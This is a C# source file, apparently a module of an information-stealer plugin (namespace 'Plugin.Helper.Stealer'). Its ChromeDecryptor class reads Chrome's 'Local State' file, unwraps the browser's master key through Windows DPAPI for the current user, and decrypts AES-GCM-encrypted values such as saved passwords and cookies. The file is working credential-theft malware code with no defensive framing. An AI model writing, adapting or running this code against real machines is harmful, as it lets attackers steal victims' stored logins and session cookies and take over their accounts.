

using Microsoft.CSharp.RuntimeBinder;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Web.Script.Serialization;


namespace Plugin.Helper.Stealer
{
	public class ChromeDecryptor
	{
		private byte[] masterKey;
		public bool operational;

		public ChromeDecryptor(string UserDataPath)
		{
			if (!UserDataPath.EndsWith("Local State"))
				UserDataPath = Path.Combine(UserDataPath, "Local State");
			this.masterKey = ChromeDecryptor.GetMasterKey(UserDataPath);
			this.operational = this.masterKey != null;
		}

        private static byte[] GetMasterKey(string path)
        {
            if (!File.Exists(path))
                return null;

            string jsonContent = Utils.ForceReadFileString(path);
            if (jsonContent == null || !jsonContent.Contains("os_crypt"))
                return null;

            try
            {
                var serializer = new JavaScriptSerializer();
                var data = serializer.Deserialize<Dictionary<string, object>>(jsonContent);

                if (data == null || !data.ContainsKey("os_crypt"))
                    return null;

                var osCrypt = data["os_crypt"] as Dictionary<string, object>;
                if (osCrypt == null || !osCrypt.ContainsKey("encrypted_key"))
                    return null;

                string encryptedKey = osCrypt["encrypted_key"] as string;
                if (string.IsNullOrEmpty(encryptedKey))
                    return null;

                byte[] encryptedBytes = Convert.FromBase64String(encryptedKey);

                if (encryptedBytes.Length <= 5)
                    return null;

                byte[] decrypted = ProtectedData.Unprotect(
                    encryptedBytes.Skip(5).ToArray(),
                    null,
                    DataProtectionScope.CurrentUser
                );

                return decrypted;
            }
            catch
            {
                return null;
            }
        }

        public string DecryptBase64(string buffer)
		{
			try
			{
				return this.Decrypt(Convert.FromBase64String(buffer));
			}
			catch
			{
				return (string) null;
			}
		}

		public string Decrypt(byte[] buffer)
		{
			try
			{
				byte[] numArray1 = new byte[12];
				Array.Copy((Array) buffer, 3, (Array) numArray1, 0, 12);
				int length1 = buffer.Length - 15;
				byte[] numArray2 = new byte[length1];
				Array.Copy((Array) buffer, 15, (Array) numArray2, 0, length1);
				int length2 = 16;
				byte[] numArray3 = new byte[length2];
				byte[] numArray4 = new byte[length1 - length2];
				Array.Copy((Array) numArray2, length1 - length2, (Array) numArray3, 0, length2);
				Array.Copy((Array) numArray2, 0, (Array) numArray4, 0, length1 - length2);
				return Encoding.UTF8.GetString(AesGcm.Decrypt(this.masterKey, numArray1, (byte[]) null, numArray4, numArray3));
			}
			catch
			{
				return (string) null;
			}
		}
	}
}
